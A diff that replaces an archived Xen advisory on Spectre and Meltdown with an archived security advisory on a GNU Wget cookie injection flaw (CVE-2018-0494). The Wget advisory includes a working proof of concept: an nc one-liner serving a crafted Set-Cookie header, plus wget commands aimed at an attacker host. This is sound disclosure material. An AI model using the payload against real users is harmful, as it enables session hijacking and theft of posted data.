@@ -1,207 +1,132 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/12/6
-Message-Id: <E1ea3Fo-0000JJ-8f@xenbits.xenproject.org>
-Date: Fri, 12 Jan 2018 17:36:32 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/06/1
+Message-ID: <alpine.DEB.2.20.1805062351410.4338@o7.fi>
+Date: Sun, 6 May 2018 23:53:53 +0300 (EEST)
+From: Harry Sintonen <sintonen@....fi>
+To: oss-security@...ts.openwall.com
+Subject: GNU Wget Cookie Injection [CVE-2018-0494]
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
-
- Xen Security Advisory CVE-2017-5753,CVE-2017-5715,CVE-2017-5754 / XSA-254
-                                 version 6
-
-        Information leak via side effects of speculative execution
-
-UPDATES IN VERSION 6
-====================
-
-PVH shim ("Comet") for 4.10 is available.
-
-Mention within-guest attack in README.vixen as well as
-README.which-shim.
-
-Vixen shim converter script "exec"s qemu, avoiding stale qemu
-processes (and, therefore, avoiding stale domains).
-
-ISSUE DESCRIPTION
-=================
-
-Processors give the illusion of a sequence of instructions executed
-one-by-one.  However, in order to most efficiently use cpu resources,
-modern superscalar processors actually begin executing many
-instructions in parallel.  In cases where instructions depend on the
-result of previous instructions or checks which have not yet
-completed, execution happens based on guesses about what the outcome
-will be.  If the guess is correct, execution has been sped up.  If the
-guess is incorrect, partially-executed instructions are cancelled and
-architectural state changes (to registers, memory, and so on)
-reverted; but the whole process is no slower than if no guess had been
-made at all.  This is sometimes called "speculative execution".
-
-Unfortunately, although architectural state is rolled back, there are
-other side effects, such as changes to TLB or cache state, which are
-not rolled back.  These side effects can subsequently be detected by
-an attacker to determine information about what happened during the
-speculative execution phase.  If an attacker can cause speculative
-execution to access sensitive memory areas, they may be able to infer
-what that sensitive memory contained.
-
-Furthermore, these guesses can often be 'poisoned', such that attacker
-can cause logic to reliably 'guess' the way the attacker chooses.
-This advisory discusses three ways to cause speculative execution to
-access sensitive memory areas (named here according to the
-discoverer's naming scheme):
-
-"Bounds-check bypass" (aka SP1, "Variant 1", Spectre CVE-2017-5753):
-Poison the branch predictor, such that victim code is speculatively
-executed past boundary and security checks.  This would allow an
-attacker to, for instance, cause speculative code in the normal
-hypercall / emulation path to execute with wild array indexes.
-
-"Branch Target Injection" (aka SP2, "Variant 2", Spectre CVE-2017-5715):
-Poison the branch predictor.  Well-abstracted code often involves
-calling function pointers via indirect branches; reading these
-function pointers may involve a (slow) memory access, so the CPU
-attempts to guess where indirect branches will lead.  Poisoning this
-enables an attacker to speculatively branch to any code that is
-executable by the victim (eg, anywhere in the hypervisor).
-
-"Rogue Data Load" (aka SP3, "Variant 3", Meltdown, CVE-2017-5754):
-On some processors, certain pagetable permission checks only happen
-when the instruction is retired; effectively meaning that speculative
-execution is not subject to pagetable permission checks.  On such
-processors, an attacker can speculatively execute arbitrary code in
-userspace with, effectively, the highest privilege level.
-
-More information is available here:
-  https://meltdownattack.com/
-  https://spectreattack.com/
-  https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html
-
-Additional Xen-specific background:
-
-Xen hypervisors on most systems map all of physical RAM, so code
-speculatively executed in a hypervisor context can read all of system
-RAM.
-
-When running PV guests, the guest and the hypervisor share the address
-space; guest kernels run in a lower privilege level, and Xen runs in
-the highest privilege level.  (x86 HVM and PVH guests, and ARM guests,
-run in a separate address space to the hypervisor.)  However, only
-64-bit PV guests can generate addresses large enough to point to
-hypervisor memory.
-
-IMPACT
-======
-
-Xen guests may be able to infer the contents of arbitrary host memory,
-including memory assigned to other guests.
-
-An attacker's choice of code to speculatively execute (and thus the
-ease of extracting useful information) goes up with the numbers.  For
-SP1, an attacker is limited to windows of code after bound checks of
-user-supplied indexes.  For SP2, the attacker will in many cases will
-be limited to executing arbitrary pre-existing code inside of Xen.
-For SP3 (and other cases for SP2), an attacker can write arbitrary
-code to speculatively execute.
-
-Additionally, in general, attacks within a guest (from guest user to
-guest kernel) will be the same as on real hardware.  Consult your
-operating system provider for more information.
-
-NOTE ON TIMING
-==============
-
-This vulnerability was originally scheduled to be made public on 9
-January.  It was accelerated at the request of the discloser due to
-one of the issues being made public.
-
-VULNERABLE SYSTEMS
-==================
-
-Systems running all versions of Xen are affected.
-
-For SP1 and SP2, both Intel and AMD are vulnerable.  Vulnerability of
-ARM processors to SP1 and SP2 varies by model and manufacturer.  ARM
-has information on affected models on the following website:
-   https://developer.arm.com/support/security-update
-
-For SP3, only Intel processors are vulnerable.  (The hypervisor cannot
-be attacked using SP3 on any ARM processors, even those that are
-listed as affected by SP3.)
-
-Furthermore, only 64-bit PV guests can exploit SP3 against Xen.  PVH,
-HVM, and 32-bit PV guests cannot exploit SP3.
-
-MITIGATION
-==========
-
-There is no mitigation for SP1 and SP2.
-
-SP3 can be mitigated by running guests in HVM or PVH mode.
-(Within-guest attacks are still possible unless the guest OS has also
-been updated with an SP3 mitigation series such as KPTI/Kaiser.)
-
-For guests with legacy PV kernels which cannot be run in HVM or PVH
-mode directly, we have developed two "shim" hypervisors that allow PV
-guests to run in HVM mode or PVH mode.  This prevents attacks on the
-host, but it leaves the guest vulnerable to Meltdown attacks by its
-own unprivileged processes, even if the guest OS has KPTI or similar
-Meltdown mitigation.
-
-The HVM shim (codenamed "Vixen") is available now, as is the PVH shim
-(codenamed "Comet") for Xen 4.10.  We expect to have Comet for 4.8 and
-4.9 within a few days.  Please read README.which-shim to determine
-which shim is suitable for you.
-
-$ sha256sum xsa254*/*
-f81c4624f8b188a2c33efa8687d3442bbd17c476e1a10761ef70c0aa99f6c659  xsa254/README.comet
-1c594822dbd95998951203f6094bc77586d5720788de15897784d20bacb2ef08  xsa254/README.vixen
-7e816160c1c1d1cd93ec3c3dd9753c8f3957fefe86b7aa967e9e77833828f849  xsa254/README.which-shim
-1d2098ad3890a5be49444560406f8f271c716e9f80e7dfe11ff5c818277f33f8  xsa254/pvshim-converter.pl
-$
-
-RESOLUTION
-==========
-
-There is no available resolution for SP1.  A solution may be available
-in the future.
-
-We are working on patches which mitigate SP2 but these are not
-currently available.  Given that the vulnerabilities are now public,
-these will be developed and published in public, initially via
-xen-devel.
+GNU Wget Cookie Injection [CVE-2018-0494]
+=========================================
+The latest version of this advisory is available at:
+https://sintonen.fi/advisories/gnu-wget-cookie-injection.txt
 
 
-NOTE ON LACK OF EMBARGO
-=======================
+Overview
+--------
 
-The timetable and process were set by the discloser.
+GNU Wget is susceptible to a malicious web server injecting arbitrary cookies to
+the cookie jar file.
 
-After the intensive initial response period for these vulnerabilities
-is over, we will prepare and publish a full timeline, as we have done
-in a handful of other cases of significant public interest where we
-saw opportunities for process improvement.
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQEcBAEBCAAGBQJaWPIbAAoJEIP+FMlX6CvZQuoH/0A21scnQhrQPmFjtBO0b0Ai
-/xQ7VCf2t3iKeZYJJGzj2atE1Hj91H6sZe6t6tLFbfPeYv2Gbfpl/09EE8ONSpSj
-ae69fgwQN/EvpkCVec+QWQ0pWj7tLYgkT4IwQJSW+6VrTWjEV8PzQgkfjgclJEOk
-J7EhaauI0qZVPEC2QZoMGJlgwfoS4xJalpCUGflrvgtmPhYbGGYDP8bP7WbVtqYS
-I9nIoqndBdeWeyyu1O+cnMquV5BX2Nq7BDOTB3SMwNBHsnKudRQQRc3yNdmvQa2C
-jvUMs/U7rqfK5pgOfimvLSDLR0TSnzNC8ahuI9Tv6TSwIl+AVt4xg0DZzhMjiqQ=
-=aOVG
------END PGP SIGNATURE-----
+Description
+-----------
 
-Download attachment "xsa254/README.comet" of type "application/octet-stream" (1828 bytes)
+Normally a website should not be able to set cookies for other domains. Due to
+insufficient input validation GNU Wget can be tricked into storing arbitrary cookie
+values to the cookie jar file, bypassing this security restriction.
 
-Download attachment "xsa254/README.vixen" of type "application/octet-stream" (2736 bytes)
 
-Download attachment "xsa254/README.which-shim" of type "application/octet-stream" (4010 bytes)
+Impact
+------
 
-Download attachment "xsa254/pvshim-converter.pl" of type "application/octet-stream" (6762 bytes)
+An external attacker is able to inject arbitrary cookie values cookie jar file,
+adding new or replacing existing cookie values.
+
+
+Details
+-------
+
+The discovered vulnerability, described in more detail below, enables the attack
+described here in brief.
+
+1. The attacker controlled web site sends a specially crafted Set-Cookie -header
+    to inject a new authentication cookie for example.com, replacing the existing
+    one. In order to be successful the victim must perform a wget operation on the
+    attacker controller site, for example:
+    wget --load-cookies jar.txt --save-cookies jar.txt https://evil.invalid
+2. Victim uses wget to post some secret the the api.example.com:
+    wget --load-cookies jar.txt --post-file secret.txt https://example.com/upload
+
+Since the attacker was able to replace the authentication cookie for example.com,
+the secret.txt data will be posted to attacker's account instead to that of the
+victim.
+
+
+Vulnerabilities
+---------------
+
+1. CWE-20: Improper Input Validation in Set-Cookie parsing [CVE-2018-0494]
+
+The cookie parsing implementation does too lax input validation when parsing the
+Set-Cookie response from the server. Consider the following malicious response:
+
+HTTP/1.1 200 OK
+Content-Length: 0
+Set-Cookie: foo="bar
+  .google.com	TRUE	/	FALSE	1900000000	injected	cookie
+ 	";expires=Thursday, 01-Jan-2032 08:00:00 GMT
+
+
+When parsed by Wget and stored to a cookie jar file it will appear as:
+
+# HTTP cookie file.
+# Generated by Wget on 2018-04-27 23:28:21.
+# Edit at your own risk.
+
+127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	"bar
+  .google.com	TRUE	/	FALSE	1900000000	injected	cookie
+ 	"
+
+Since the Wget cookie jar parser skips any leading spaces, the .google.com line
+will be picked up.
+
+Note: The order in which the hosts/domains are stored in the cookie jar is derived
+from the hashing function used to speed up the lookups. If an existing cookie is
+to be replaced the server hostname used to serve the Set-Cookie will need to be
+carefully chosen to result in hash entry below the targeted domain. If not done,
+the original cookie will be used instead of the injected one.
+
+
+Proof of Concept
+----------------
+
+1. Set up a minimal web server, good for 1 request:
+  $ echo -ne 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\nSet-Cookie: foo="bar\r\n\x20.google.com\tTRUE\t/\tFALSE\t1900000000\tinjected\tcookie\r\n\t";expires=Thursday, 01-Jan-2032 08:00:00 GMT\r\n\r\n' | nc -v -l 7777
+
+2. Fetch the evil url:
+  $ wget --save-cookies jar.txt http://127.0.0.1:7777/plop
+
+3. Examine the resulting cookie jar file:
+  $ cat jar.txt
+
+
+Vulnerable versions
+-------------------
+
+The following GNU Wget versions are confirmed vulnerable:
+
+- 1.7 thru 1.19.4
+
+
+Mitigation
+----------
+
+1. Upgrade to GNU Wget 1.19.5 or later, or to appropriate security updated package
+    in your distribution
+
+
+Credits
+-------
+
+The vulnerability was discovered by Harry Sintonen / F-Secure Corporation.
+
+
+Timeline
+--------
+
+2018.04.26  discovered & reported the vulnerability
+2018.04.27  CVE-2018-0494 assigned
+2018.05.06  GNU Wget 1.19.5 released with the fix
+2018.05.06  public disclosure of the advisory
